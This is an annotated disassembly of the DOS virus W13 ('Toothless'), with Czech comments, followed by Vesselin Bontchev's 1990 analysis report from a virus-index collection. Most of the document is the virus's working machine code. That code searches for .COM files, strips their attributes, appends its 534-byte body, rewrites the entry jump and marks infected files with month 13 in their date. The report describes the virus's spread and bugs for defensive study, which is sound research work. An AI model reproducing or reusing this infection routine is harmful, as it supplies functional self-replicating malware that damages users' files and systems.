;=====================================================================
; virus W13                                        22:27:35  9/16/1991
; nerezidentni virus, napada .COM soubory, nastavuje den na 13.
;
AX=0000  BX=0000  CX=11FA  DX=0000  SP=FFFE  BP=0000  SI=0000  DI=0000
DS=34FD  ES=34FD  SS=34FD  CS=34FD  IP=0100   NV UP EI PL NZ NA PO NC
34FD:0100 E9E10F         JMP    10E4

34FD:10E4 50             PUSH   AX
34FD:10E5 BE4912         MOV    SI,1249       ; posun 165H
34FD:10E8 8BD6           MOV    DX,SI
34FD:10EA 81C60000       ADD    SI,0000
34FD:10EE FC             CLD
34FD:10EF B90300         MOV    CX,0003       ; obnova puvodnich
34FD:10F2 BF0001         MOV    DI,0100       ;              instrukci
34FD:10F5 F3             REPZ
34FD:10F6 A4             MOVSB
34FD:10F7 8BFA           MOV    DI,DX
34FD:10F9 B430           MOV    AH,30         ; verze OS
34FD:10FB CD21           INT    21
34FD:10FD 3C00           CMP    AL,00         ;=======================
34FD:10FF 7503           JNZ    1104
34FD:1101 E93F01         JMP    1243
34FD:1104 BA2C00         MOV    DX,002C
34FD:1107 03D7           ADD    DX,DI
34FD:1109 8BDA           MOV    BX,DX
34FD:110B B41A           MOV    AH,1A         ; nastav DTA
34FD:110D CD21           INT    21
34FD:110F BD0000         MOV    BP,0000
34FD:1112 8BD7           MOV    DX,DI
34FD:1114 81C20700       ADD    DX,0007
34FD:1118 B90300         MOV    CX,0003
34FD:111B B44E           MOV    AH,4E         ; hledej vyhovujici
34FD:111D CD21           INT    21            ;                 soubor
34FD:111F E90400         JMP    1126
34FD:1122 B44F           MOV    AH,4F         ; hledej nasledujici
34FD:1124 CD21           INT    21            ;                 soubor
34FD:1126 7315           JNB    113D
34FD:1128 3C12           CMP    AL,12
34FD:112A 7403           JZ     112F
34FD:112C E90D01         JMP    123C
34FD:112F 83FDFF         CMP    BP,-01
34FD:1132 7503           JNZ    1137
34FD:1134 E90501         JMP    123C
34FD:1137 4A             DEC    DX
34FD:1138 BDFFFF         MOV    BP,FFFF
34FD:113B EBDB           JMP    1118
34FD:113D 8B4F18         MOV    CX,[BX+18]
34FD:1140 81E1E001       AND    CX,01E0       ; vymaskuj den
34FD:1144 81F9A001       CMP    CX,01A0       ; test na 13
34FD:1148 74D8           JZ     1122
34FD:114A 817F1A00FA     CMP    Word Ptr [BX+1A],FA00       ; velikost
34FD:114F 77D1           JA     1122
34FD:1151 817F1A0001     CMP    Word Ptr [BX+1A],0100
34FD:1156 72CA           JB     1122
34FD:1158 57             PUSH   DI
34FD:1159 8BF3           MOV    SI,BX
34FD:115B 83C61E         ADD    SI,+1E
34FD:115E 81C71400       ADD    DI,0014
34FD:1162 83FDFF         CMP    BP,-01
34FD:1165 7503           JNZ    116A
34FD:1167 B05C           MOV    AL, '\'
34FD:1169 AA             STOSB
34FD:116A AC             LODSB               ; prenos jmena
34FD:116B AA             STOSB
34FD:116C 3C00           CMP    AL,00
34FD:116E 75FA           JNZ    116A
34FD:1170 5F             POP    DI
34FD:1171 8BD7           MOV    DX,DI
34FD:1173 81C21400       ADD    DX,0014
34FD:1177 B80043         MOV    AX,4300       ; zmen attributy souboru
34FD:117A CD21           INT    21
34FD:117C 898D2200       MOV    [DI+0022],CX
34FD:1180 81E1FEFF       AND    CX,FFFE
34FD:1184 8BD7           MOV    DX,DI
34FD:1186 81C21400       ADD    DX,0014
34FD:118A B80143         MOV    AX,4301
34FD:118D CD21           INT    21            ;-----------------------
34FD:118F 8BD7           MOV    DX,DI
34FD:1191 81C21400       ADD    DX,0014
34FD:1195 B8023D         MOV    AX,3D02   ; otevri soubor
34FD:1198 CD21           INT    21        ;---------------------------
34FD:119A 7303           JNB    119F
34FD:119C E99400         JMP    1233
34FD:119F 8BD8           MOV    BX,AX
34FD:11A1 B80057         MOV    AX,5700        ; precti datum posledni
34FD:11A4 CD21           INT    21             ; modifikace
34FD:11A6 898D2400       MOV    [DI+0024],CX
34FD:11AA 89952600       MOV    [DI+0026],DX
34FD:11AE B43F           MOV    AH,3F          ; precti 3 byte
34FD:11B0 B90300         MOV    CX,0003
34FD:11B3 8BD7           MOV    DX,DI
34FD:11B5 81C20000       ADD    DX,0000
34FD:11B9 CD21           INT    21
34FD:11BB 7303           JNB    11C0
34FD:11BD E95A00         JMP    121A
34FD:11C0 3D0300         CMP    AX,0003
34FD:11C3 7555           JNZ    121A
34FD:11C5 B80242         MOV    AX,4202
34FD:11C8 B90000         MOV    CX,0000
34FD:11CB 8BD1           MOV    DX,CX
34FD:11CD CD21           INT    21
34FD:11CF 2D0300         SUB    AX,0003
34FD:11D2 89850400       MOV    [DI+0004],AX
34FD:11D6 B96501         MOV    CX,0165         ; vypocet pocatku dat.
34FD:11D9 83FA00         CMP    DX,+00          ; oblasti
34FD:11DC 753C           JNZ    121A
34FD:11DE 8BD7           MOV    DX,DI
34FD:11E0 2BF9           SUB    DI,CX
34FD:11E2 83C702         ADD    DI,+02
34FD:11E5 050301         ADD    AX,0103
34FD:11E8 03C1           ADD    AX,CX
34FD:11EA 8905           MOV    [DI],AX
34FD:11EC B440           MOV    AH,40     ; zapis virus
34FD:11EE 8BFA           MOV    DI,DX
34FD:11F0 2BD1           SUB    DX,CX
34FD:11F2 B91602         MOV    CX,0216
34FD:11F5 CD21           INT    21
34FD:11F7 7303           JNB    11FC
34FD:11F9 E91E00         JMP    121A
34FD:11FC 3D1602         CMP    AX,0216
34FD:11FF 7519           JNZ    121A
34FD:1201 B80042         MOV    AX,4200   ; seek na zacatek
34FD:1204 B90000         MOV    CX,0000
34FD:1207 8BD1           MOV    DX,CX
34FD:1209 CD21           INT    21        ;---------------------------
34FD:120B 720D           JB     121A
34FD:120D B440           MOV    AH,40     ; zapis 3 byte
34FD:120F B90300         MOV    CX,0003
34FD:1212 8BD7           MOV    DX,DI
34FD:1214 81C20300       ADD    DX,0003
34FD:1218 CD21           INT    21
34FD:121A 8B8D2400       MOV    CX,[DI+0024]
34FD:121E 8B952600       MOV    DX,[DI+0026]
34FD:1222 81E21FFE       AND    DX,FE1F       ; nastav datum na 13
34FD:1226 81CAA001       OR     DX,01A0
34FD:122A B80157         MOV    AX,5701       ; nastav datum a cas
34FD:122D CD21           INT    21
34FD:122F B43E           MOV    AH,3E         ; zavri soubor
34FD:1231 CD21           INT    21
34FD:1233 B80043         MOV    AX,4300       ; obnov atributy
34FD:1236 8B8D2200       MOV    CX,[DI+0022]
34FD:123A CD21           INT    21
34FD:123C BA8000         MOV    DX,0080
34FD:123F B41A           MOV    AH,1A
34FD:1241 CD21           INT    21
34FD:1243 58             POP    AX
34FD:1244 BF0001         MOV    DI,0100
34FD:1247 57             PUSH   DI
34FD:1248 C3             RET


      +14   jmeno souboru
      +22   atributy souboru
      +24   cas
      +26        a datum posledni zmeny

      +2C   nova DTA

             *********************************************
             ***   Reports collected and collated by   ***
             ***            PC-Virus Index             ***
             ***      with full acknowledgements       ***
             ***            to the authors             ***
             *********************************************


  Vesselin Bontchev reported in May 1990:

  The Toothless virus (V534) - Listed as: W13-534
  ===============================================

  This virus came from the Soviet Union and is probably created there.
  I have a Russian program against it. In the accompanying
  documentation the virus is called "a version of the 648 (Vienna)
  virus, made by a clumsy programmer". This definition is quite exact.
  The virus is really very similar to the Vienna one, with some parts
  of code removed and other slightly changed.  It is a non-resident
  virus. It infects only .COM files in the current and in the root
  directory.  The directories, listed in the PATH variable are *not*
  searched - the code for finding this variable in the environment is
  entirely removed.  The destructive function is also removed.  The
  infected files are marked not with a 62 seconds mark in their time
  of last update. Instead, a month equal to 13 in the date of last
  update is used. This is rather boring, since it can be easily seen
  (by obtaining a directory listing) and some programs (e.g., Norton
  Utilities) treat such things as "not a proper directory entry".  The
  virus increases the length of the infected files by 534 bytes.  Only
  files with length between 256 and 64000 bytes are attacked (the
  first of these numbers was 10 in the Vienna virus).  The virus is
  not very virulent - I have only one report about it.  The man who
  reported it brought me an infected COMMAND.COM and said that its
  length had changed once a bit - "about 500 bytes" - and the month in
  the file date has changed to 13.  When I was able to confirm that
  this is indeed a new virus, I checked all his files, but found
  nothing more than that infected COMMAND.COM.

  If the virus infects a file with the ReadOnly attribute set, this
  attribute is cleared after the infection. This is due to a bug in
  the virus code.

  The virus is assembled with a strange assembler (A86?).  Its
  disassembly listing cannot be assembled back with MASM or TASM to
  produce exactly the same code.


  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  ++++++++++++++++++++++++++ end of reports ++++++++++++++++++++++++
  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  